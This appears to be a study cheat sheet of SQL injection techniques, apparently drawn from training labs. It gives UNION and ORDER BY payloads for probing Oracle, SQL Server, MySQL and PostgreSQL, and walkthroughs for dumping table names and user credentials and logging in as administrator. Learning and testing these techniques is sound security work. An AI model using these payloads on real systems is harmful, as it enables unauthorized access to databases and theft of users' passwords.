<h2>SQL Injection(SQLi) ATTACK </h2>

<b>SQL Attack queries to determine the number of COLUMNS, DATATYPES of the columns and VERSION on Oracle, Microsoft, MySQL and PostgreSQL</b>

| Database | Columns Query | Datatypes | Version |
|----------|---------------|-----------|---------|
| Oracle |  ‘ ORDER BY 1-- </br> ‘ ORDER BY 3-- </br> In this example: 3 - 1 = 2(no. of columns) | ‘ UNION SELECT ‘a’ , ‘a’ FROM DUAL-- | ‘ UNION SELECT banner, NULL FROM v$version-- </br> SELECT banner FROM v$version |  
| Microsoft | same as Oracle | ‘ UNION SELECT ‘a’ , ‘a’-- | SELECT @@version | 
| MySQL | ‘ ORDER BY 1# | ‘ UNION SELECT ‘a’ , ‘a’# | SELECT @@version </br> ‘ UNION SELECT @@version, ‘a’#|
| PostgreSQL | same as Oracle | ‘ UNION SELECT ‘a’ , ‘a’-- | SELECT version() |

<b>SQLi Attack, listing the database contents on Oracle</b>
</br>
1. Use [Burp Suite](https://portswigger.net/burp/communitydownload) to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:  '+UNION+SELECT+'abc','def'+FROM+dual--
3. Use the following payload to retrieve the list of tables in the database:  '+UNION+SELECT+table_name,NULL+FROM+all_tables--
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:  '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:  '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
8. Find the password for the administrator user, and use it to log in.
</br>

<b>SQLi UNION attack, finding a column containing text</b>
</br>
1. Use Burp Suite to intercept and modify the request that sets the product category filter. </br>
2. Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:  '+UNION+SELECT+NULL,NULL,NULL-- </br>
3. Try replacing each null with the random value, for example:  '+UNION+SELECT+'abcdef',NULL,NULL-- </br>
4. If an error occurs, move on to the next null and try that instead.
</br>
